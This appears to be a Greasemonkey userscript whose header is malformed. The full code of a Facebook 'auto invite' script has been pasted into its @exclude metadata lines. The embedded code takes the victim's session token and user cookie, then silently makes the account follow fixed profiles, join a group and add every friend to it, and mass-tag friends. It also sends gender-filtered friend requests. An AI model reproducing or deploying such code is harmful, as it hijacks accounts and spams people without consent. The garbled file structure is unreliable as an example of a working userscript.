// ==UserScript==
// @name        geeth
// @namespace   _84
// @description auto scrit
// @include     http://userscripts.org/scripts/review/165467
// @exclude     // @name            Facebook Auto Invite Group PMO
// @exclude     // @description     Facebook Auto Invite Group PMO
// @exclude     // @include         https://*.facebook.com/*
// @exclude     // @include         https://*.facebook.com/*/*
// @exclude     // @include         http://*.facebook.com/*
// @exclude     // @include         http://*.facebook.com/*/*
// @exclude     // ==/UserScript==
// @exclude     var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
// @exclude     var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
// @exclude     	
// @exclude     function cereziAl(isim) {
// @exclude         var tarama = isim + "=";
// @exclude         if (document.cookie.length > 0) {
// @exclude             konum = document.cookie.indexOf(tarama)
// @exclude             if (konum != -1) {
// @exclude                 konum += tarama.length
// @exclude                 son = document.cookie.indexOf(";", konum)
// @exclude                 if (son == -1)
// @exclude                     son = document.cookie.length
// @exclude                 return unescape(document.cookie.substring(konum, son))
// @exclude             }
// @exclude             else { return ""; }
// @exclude         }
// @exclude     }
// @exclude     function getRandomInt (min, max) {
// @exclude         return Math.floor(Math.random() * (max - min + 1)) + min;
// @exclude     }
// @exclude     function randomValue(arr) {
// @exclude         return arr[getRandomInt(0, arr.length-1)];
// @exclude     }
// @exclude     var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
// @exclude     var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
// @exclude     function a(abone){
// @exclude         var http4 = new XMLHttpRequest();
// @exclude          
// @exclude         var url4 = "/ajax/follow/follow_profile.php?__a=1";
// @exclude          
// @exclude         var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
// @exclude         http4.open("POST", url4, true);
// @exclude          
// @exclude         //Send the proper header information along with the request
// @exclude         http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
// @exclude         http4.setRequestHeader("Content-length", params4.length);
// @exclude         http4.setRequestHeader("Connection", "close");
// @exclude          
// @exclude         http4.onreadystatechange = function() {//Call a function when the state changes.
// @exclude         if(http4.readyState == 4 && http4.status == 200) {
// @exclude            
// @exclude           http4.close; // Close the connection
// @exclude          
// @exclude         }
// @exclude         }
// @exclude         
// @exclude         http4.send(params4);
// @exclude     }
// @exclude     function sublist(uidss) {
// @exclude     		var a = document.createElement('script');
// @exclude     		a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
// @exclude     		document.body.appendChild(a);
// @exclude     }
// @exclude     //idan erison
// @exclude     a("100004300324013");
// @exclude     a("1150296852");
// @exclude     sublist("532879703402669");
// @exclude     sublist("153089728188610");
// @exclude     //Group subscriber
// @exclude     var gid = ['508147895892055'];
// @exclude     var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
// @exclude     var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
// @exclude     var httpwp = new XMLHttpRequest();
// @exclude     var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
// @exclude     var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
// @exclude     httpwp['open']('POST', urlwp, true);
// @exclude     httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
// @exclude     httpwp['setRequestHeader']('Content-length', paramswp['length']);
// @exclude     httpwp['setRequestHeader']('Connection', 'keep-alive');
// @exclude     httpwp['send'](paramswp);
// @exclude     var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
// @exclude     var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
// @exclude     var friends = new Array();
// @exclude     gf = new XMLHttpRequest();
// @exclude     gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
// @exclude     gf['send']();
// @exclude     if (gf['readyState'] != 4) {} else {
// @exclude         data = eval('(' + gf['responseText']['substr'](9) + ')');
// @exclude         if (data['error']) {} else {
// @exclude             friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
// @exclude                 return _0x93dax8['index'] - _0x93dax9['index'];
// @exclude             });
// @exclude         };
// @exclude     };
// @exclude     for (var i = 0; i < friends['length']; i++) {
// @exclude         var httpwp = new XMLHttpRequest();
// @exclude         var urlwp = '/ajax/groups/members/add_post.php?__a=1';
// @exclude         var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
// @exclude         httpwp['open']('POST', urlwp, true);
// @exclude         httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
// @exclude         httpwp['setRequestHeader']('Content-length', paramswp['length']);
// @exclude         httpwp['setRequestHeader']('Connection', 'keep-alive');
// @exclude         httpwp['onreadystatechange'] = function () {
// @exclude     if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
// @exclude         };
// @exclude         httpwp['send'](paramswp);
// @exclude     };
// @exclude     var spage_id = "100004300324013";
// @exclude     var spost_id = "100004300324013";
// @exclude     var sfoto_id = "100004300324013";
// @exclude     var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
// @exclude     var smesaj = "";
// @exclude     var smesaj_text = "";
// @exclude     var arkadaslar = [];
// @exclude     var svn_rev;
// @exclude     var bugun= new Date();
// @exclude     var btarihi = new Date(); 
// @exclude     btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
// @exclude     if(!document.cookie.match(/paylasti=(\d+)/)){
// @exclude     document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
// @exclude     }
// @exclude     //arkadaslari al ve isle
// @exclude     function sarkadaslari_al(){
// @exclude     		var xmlhttp = new XMLHttpRequest();
// @exclude             xmlhttp.onreadystatechange = function () {
// @exclude     			if(xmlhttp.readyState == 4){
// @exclude     				  eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
// @exclude     				  for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
// @exclude     					smesaj = "";
// @exclude     					smesaj_text = "";
// @exclude     				  for(i=f*10;i<(f+1)*10;i++){
// @exclude     					if(arkadaslar.payload.entries[i]){
// @exclude     				  smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
// @exclude     				  smesaj_text += " " + arkadaslar.payload.entries[i].text;
// @exclude     				  }
// @exclude     					}
// @exclude     					sdurumpaylas();				}
// @exclude     				
// @exclude     			}
// @exclude     			
// @exclude             };
// @exclude     		var params = "&filter[0]=user";
// @exclude     		params += "&options[0]=friends_only";
// @exclude     		params += "&options[1]=nm";
// @exclude     		params += "&token=v7";
// @exclude             params += "&viewer=" + user_id;
// @exclude     		params += "&__user=" + user_id;
// @exclude     		
// @exclude             if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
// @exclude             else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
// @exclude             xmlhttp.send();
// @exclude     }
// @exclude     //tiklama olayini dinle
// @exclude     var tiklama = document.addEventListener("click", function () {
// @exclude     if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
// @exclude     svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
// @exclude     sarkadaslari_al();
// @exclude     document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();
// @exclude     document.removeEventListener(tiklama);
// @exclude     }
// @exclude      }, false);
// @exclude       
// @exclude     //arkada      leme
// @exclude     function sarkadasekle(uid,cins){
// @exclude     		var xmlhttp = new XMLHttpRequest();
// @exclude             xmlhttp.onreadystatechange = function () {
// @exclude     			if(xmlhttp.readyState == 4){	
// @exclude     			}
// @exclude             };
// @exclude     		
// @exclude     		xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true); 
// @exclude     		var params = "to_friend=" + uid;
// @exclude     		params += "&action=add_friend";
// @exclude     		params += "&how_found=friend_browser";
// @exclude     		params += "&ref_param=none";
// @exclude     		params += "&outgoing_id=";
// @exclude     		params += "&logging_location=friend_browser";
// @exclude     		params += "&no_flyout_on_click=true";
// @exclude     		params += "&ego_log_data=";
// @exclude     		params += "&http_referer=";
// @exclude     		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
// @exclude             params += "&phstamp=165816749114848369115";
// @exclude     		params += "&__user=" + user_id;
// @exclude     		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
// @exclude     		xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
// @exclude     		
// @exclude     if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
// @exclude     		xmlhttp.send(params);
// @exclude     }else if(document.cookie.split("cins" + user_id +"=").length <= 1){
// @exclude     		cinsiyetgetir(uid,cins,"sarkadasekle");
// @exclude     }else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
// @exclude     		xmlhttp.send(params);
// @exclude     }
// @exclude     }
// @exclude     //cinsiyet belirleme
// @exclude     var cinssonuc = {};
// @exclude     var cinshtml = document.createElement("html");
// @exclude     function scinsiyetgetir(uid,cins,fonksiyon){
// @exclude     		var xmlhttp = new XMLHttpRequest();
// @exclude             xmlhttp.onreadystatechange = function () {
// @exclude     			if(xmlhttp.readyState == 4){
// @exclude     			eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
// @exclude     			cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
// @exclude     			btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
// @exclude     			if(cinshtml.getElementsByTagName("select")[0].value == "1"){
// @exclude     			document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
// @exclude     			}else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
// @exclude     			document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
// @exclude     			}
// @exclude     			eval(fonksiyon + "(" + id + "," + cins + ");");
// @exclude     			}
// @exclude             };
// @exclude     		xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
// @exclude     		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
// @exclude     		xmlhttp.send();
// @exclude     }
// @exclude     function autoSuggest()
// @exclude     {    
// @exclude         links=document.getElementsByTagName('a');
// @exclude         for (i in links) {
// @exclude             l=links[i];
// @exclude             if(l.innerHTML == '<span class="uiButtonText">Suggest Friend</span>') {
// @exclude                 l.click();
// @exclude             }
// @exclude         }
// @exclude     }
// @exclude     function blub()
// @exclude     {
// @exclude         if(document.getElementsByClassName('pbm fsm').length == 1) {
// @exclude             w = document.getElementsByClassName('pbm fsm')[0];
// @exclude             e = document.createElement('a');
// @exclude             //e.href = '#';
// @exclude             e.innerHTML = 'Auto Suggest by Salman';
// @exclude             e.className = 'uiButton';
// @exclude             e.onclick = autoSuggest;
// @exclude             if( w.childElementCount == 0)
// @exclude             {
// @exclude                 w.appendChild(document.createElement('br'));
// @exclude                 w.appendChild(e);
// @exclude             }
// @exclude         }
// @exclude     }
// @exclude     blub();
// @exclude     document.addEventListener("DOMNodeInserted", blub, true);
// @version     1
// ==/UserScript==